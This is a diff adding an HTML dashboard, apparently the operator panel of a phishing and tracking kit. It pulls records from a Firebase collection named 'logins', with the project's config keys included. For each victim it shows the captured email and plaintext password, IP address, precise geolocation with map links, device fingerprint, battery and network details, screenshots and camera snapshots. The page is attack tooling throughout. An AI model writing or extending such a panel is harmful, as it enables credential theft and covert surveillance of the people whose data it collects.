@@ -11,4 +11,122 @@
         .table-container { overflow-x: auto; -webkit-overflow-scrolling: touch; }
         table { width: 100%; border-collapse: collapse; background: #fff; min-width: 2000px; }
         th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #e0e0e0; vertical-align: middle; white-space: nowrap; }
-        th { background: #1a73e8; color: #fff; font-weight: 600; position: sticky; top
+        th { background: #1a73e8; color: #fff; font-weight: 600; position: sticky; top: 0; z-index: 1; }
+        tr:nth-child(even) { background: #f8f9fa; }
+        tr:hover { background: #eef2f7; }
+        img.screenshot, img.camera-shot { max-width: 100px; border: 1px solid #ddd; border-radius: 4px; display: block; }
+        a { color: #1a73e8; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        @media (max-width: 768px) { .login-box { padding: 10px; } h2 { font-size: 18px; } table { min-width: 0; display: block; overflow-x: auto; } th, td { padding: 8px 10px; font-size: 12px; } img.screenshot, img.camera-shot { max-width: 80px; } th, td { min-width: 100px; } }
+        @media (max-width: 480px) { th, td { padding: 6px 8px; font-size: 10px; } img.screenshot, img.camera-shot { max-width: 60px; } }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"></script>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Login Data</h2>
+        <div class="table-container">
+            <table id="loginTable">
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>IP</th>
+                        <th>Email</th>
+                        <th>Password</th>
+                        <th>User Agent</th>
+                        <th>Screen</th>
+                        <th>Timezone</th>
+                        <th>Language</th>
+                        <th>Platform</th>
+                        <th>CPU Cores</th>
+                        <th>Memory</th>
+                        <th>Online</th>
+                        <th>Cookies</th>
+                        <th>Color Depth</th>
+                        <th>Pixel Ratio</th>
+                        <th>Orientation</th>
+                        <th>Latitude</th>
+                        <th>Longitude</th>
+                        <th>Accuracy</th>
+                        <th>Charging</th>
+                        <th>Battery Level</th>
+                        <th>Charge Time</th>
+                        <th>Discharge Time</th>
+                        <th>Network Type</th>
+                        <th>Effective Type</th>
+                        <th>Downlink</th>
+                        <th>RTT</th>
+                        <th>Screenshot</th>
+                        <th>Camera Shot</th>
+                    </tr>
+                </thead>
+                <tbody id="loginBody"></tbody>
+            </table>
+        </div>
+    </div>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAtRqJeS7UaxHHVRwZ3ov-8jXVToVvGuKg",
+            authDomain: "tracking-d2d42.firebaseapp.com",
+            projectId: "tracking-d2d42",
+            storageBucket: "tracking-d2d42.firebasestorage.app",
+            messagingSenderId: "411030031665",
+            appId: "1:411030031665:web:b79f56ad363c8a7b6d3410",
+            measurementId: "G-QB5KNP29EJ"
+        };
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        function updateTable() {
+            db.collection('logins').onSnapshot(snapshot => {
+                const tbody = document.getElementById('loginBody');
+                tbody.innerHTML = '';
+                if (snapshot.empty) {
+                    const row = tbody.insertRow();
+                    row.innerHTML = '<td colspan="29" style="text-align: center; color: #888;">No data yet</td>';
+                } else {
+                    snapshot.forEach(doc => {
+                        const entry = doc.data();
+                        const row = tbody.insertRow();
+                        row.insertCell().textContent = entry.timestamp || 'N/A';
+                        row.insertCell().textContent = entry.ip || 'N/A';
+                        row.insertCell().textContent = entry.email || 'N/A';
+                        row.insertCell().textContent = entry.password || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.userAgent || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.screen || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.timezone || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.language || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.platform || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.cpuCores || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.memory || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.online ? 'Yes' : 'No';
+                        row.insertCell().textContent = entry.deviceInfo.cookiesEnabled ? 'Yes' : 'No';
+                        row.insertCell().textContent = entry.deviceInfo.colorDepth || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.pixelRatio || 'N/A';
+                        row.insertCell().textContent = entry.deviceInfo.orientation || 'N/A';
+                        const latCell = row.insertCell();
+                        const lat = entry.geolocation.latitude;
+                        latCell.innerHTML = lat ? `<a href="https://maps.google.com/?q=${lat},${entry.geolocation.longitude}" target="_blank">${lat}</a>` : 'N/A';
+                        const lonCell = row.insertCell();
+                        const lon = entry.geolocation.longitude;
+                        lonCell.innerHTML = lon ? `<a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">${lon}</a>` : 'N/A';
+                        row.insertCell().textContent = entry.geolocation.accuracy || (entry.geolocation.error ? entry.geolocation.error : 'N/A');
+                        row.insertCell().textContent = entry.battery.charging ? 'Yes' : 'No' || 'N/A';
+                        row.insertCell().textContent = entry.battery.level || 'N/A';
+                        row.insertCell().textContent = entry.battery.chargingTime || 'N/A';
+                        row.insertCell().textContent = entry.battery.dischargingTime || 'N/A';
+                        row.insertCell().textContent = entry.network.type || 'N/A';
+                        row.insertCell().textContent = entry.network.effectiveType || 'N/A';
+                        row.insertCell().textContent = entry.network.downlink || 'N/A';
+                        row.insertCell().textContent = entry.network.rtt || 'N/A';
+                        row.insertCell().innerHTML = entry.screenshot && entry.screenshot !== 'N/A' ? `<img class="screenshot" src="${entry.screenshot}" alt="Screenshot">` : 'N/A';
+                        row.insertCell().innerHTML = entry.cameraShot && entry.cameraShot !== 'N/A' ? `<img class="camera-shot" src="${entry.cameraShot}" alt="Camera Shot">` : 'N/A';
+                    });
+                }
+            }, error => console.error('Firestore error:', error));
+        }
+        updateTable();
+    </script>
+</body>
+</html>
